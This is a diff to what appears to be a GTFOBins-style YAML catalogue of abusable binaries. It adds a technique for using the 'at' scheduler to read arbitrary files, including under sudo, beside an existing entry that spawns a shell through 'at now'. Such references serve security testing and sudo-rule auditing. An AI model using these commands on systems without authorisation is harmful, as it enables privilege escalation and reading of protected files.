@@ -7,6 +7,18 @@ functions:
     contexts:
       sudo:
       unprivileged:
+  file-read:
+  - code: |-
+      at -f /path/to/input-file  midnight
+      at -c $JOB_NR
+    comment: |-
+      The first command outputs a job id (int) which must be used in the second.
+      The output is prefixed with a sh-script.
+    contexts:
+      sudo:
+        comment: |-
+          Both commands must be run with sudo.
+      unprivileged:
   shell:
   - code: |-
       echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
